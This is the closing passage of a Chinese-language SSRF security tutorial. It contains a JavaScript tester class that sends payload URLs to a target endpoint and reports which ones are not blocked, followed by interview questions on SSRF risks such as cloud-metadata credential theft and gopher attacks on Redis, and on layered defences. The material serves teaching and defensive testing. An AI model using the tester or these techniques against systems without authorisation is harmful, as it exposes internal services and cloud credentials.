    for (const payload of payloads) {
      const result = await this.testPayload(payload);
      this.results.push(result);
    }

    return this.generateReport();
  }

  async testPayload(payload) {
    const startTime = Date.now();

    try {
      const response = await axios.get(this.endpoint, {
        params: { url: payload.url },
        timeout: 10000,
        validateStatus: () => true
      });

      return {
        name: payload.name,
        url: payload.url,
        status: response.status,
        blocked: response.status >= 400,
        responseTime: Date.now() - startTime,
        responseSize: JSON.stringify(response.data).length
      };
    } catch (error) {
      return {
        name: payload.name,
        url: payload.url,
        blocked: true,
        error: error.message
      };
    }
  }

  generateReport() {
    const vulnerable = this.results.filter(r => !r.blocked);
    const blocked = this.results.filter(r => r.blocked);

    return {
      summary: {
        total: this.results.length,
        vulnerable: vulnerable.length,
        blocked: blocked.length
      },
      vulnerablePayloads: vulnerable,
      blockedPayloads: blocked,
      recommendation: vulnerable.length > 0
        ? '检测到 SSRF 漏洞，请立即修复！'
        : '未检测到明显的 SSRF 漏洞'
    };
  }
}

// 使用示例
// const tester = new SSRFTester('http://target.com/fetch');
// const report = await tester.runTests();
// console.log(JSON.stringify(report, null, 2));
```

## 面试要点

### 常见面试问题

**问题 1：什么是 SSRF？它的危害是什么？**

SSRF（服务端请求伪造）是指攻击者能够让服务器向攻击者指定的目标发起请求的漏洞。主要危害包括：

1. **访问内部服务**：绑过防火墙访问内网服务（数据库、缓存、管理后台）
2. **云凭证泄露**：读取云实例元数据，获取 IAM 临时凭证
3. **端口扫描**：探测内网存活主机和开放端口
4. **读取本地文件**：通过 file:// 协议读取服务器文件
5. **攻击内部服务**：通过 gopher 等协议攻击 Redis、Memcached 等

**问题 2：如何防护 SSRF 漏洞？**

1. **白名单验证**：只允许访问特定的域名或 IP
2. **协议限制**：只允许 HTTP/HTTPS 协议
3. **IP 验证**：禁止访问内网 IP 和特殊 IP（如元数据地址）
4. **DNS 解析验证**：解析域名后再验证 IP
5. **禁止重定向**：或在重定向时重新验证目标
6. **网络隔离**：使用独立的网络区域处理外部请求
7. **使用代理**：通过受控代理服务器发起请求

**问题 3：如何防止 DNS 重绑定攻击？**

1. 在发起请求前解析 DNS，使用解析到的 IP 直接连接
2. 请求前后都验证 DNS 解析结果
3. 使用短 TTL 的 DNS 缓存
4. 在底层网络层面限制访问

**问题 4：云环境中的 SSRF 有什么特殊危害？**

云环境中最大的风险是可以访问实例元数据服务（如 AWS 的 169.254.169.254），获取：
- IAM 角色的临时凭证（AccessKey、SecretKey、Token）
- 实例启动脚本中的敏感信息
- SSH 密钥
- 其他配置信息

防护措施包括：
- 启用 IMDSv2（需要 Token）
- 限制 IAM 角色权限
- 使用网络策略阻止对元数据地址的访问

### 防护要点总结

```
┌─────────────────────────────────────────────────────────────┐
│                 SSRF 防护最佳实践                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 输入验证                                                 │
│     - 使用白名单验证域名                                     │
│     - 验证协议（只允许 HTTP/HTTPS）                          │
│     - 验证端口号                                            │
│                                                             │
│  2. DNS 防护                                                │
│     - 解析后验证 IP 地址                                     │
│     - 防止 DNS 重绑定攻击                                    │
│     - 禁止访问内网 IP 和特殊 IP                              │
│                                                             │
│  3. 请求控制                                                │
│     - 禁止或安全处理重定向                                   │
│     - 设置请求超时                                          │
│     - 限制响应大小                                          │
│                                                             │
│  4. 网络层防护                                              │
│     - 配置出站防火墙规则                                     │
│     - 网络隔离                                              │
│     - 使用代理服务器                                        │
│                                                             │
│  5. 云环境特殊防护                                           │
│     - 启用 IMDSv2                                           │
│     - 限制 IAM 权限                                         │
│     - 阻止元数据地址访问                                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## 总结

SSRF 是一种严重的 Web 安全漏洞，在云原生时代其危害尤为突出。由于服务器通常位于可信网络区域，一旦被利用，攻击者可以绑过防火墙访问内部服务、窃取云凭证、甚至完全控制基础设施。

防护 SSRF 需要采用纵深防御策略：

1. **代码层面**：严格验证用户输入的 URL，使用白名单，验证 DNS 解析结果
2. **网络层面**：配置出站防火墙规则，隔离敏感服务
3. **云平台层面**：启用元数据服务的安全配置，最小化 IAM 权限

记住：永远不要信任用户输入，即使是看起来无害的 URL 参数。在设计需要发起外部请求的功能时，始终考虑 SSRF 风险，并实施相应的防护措施。
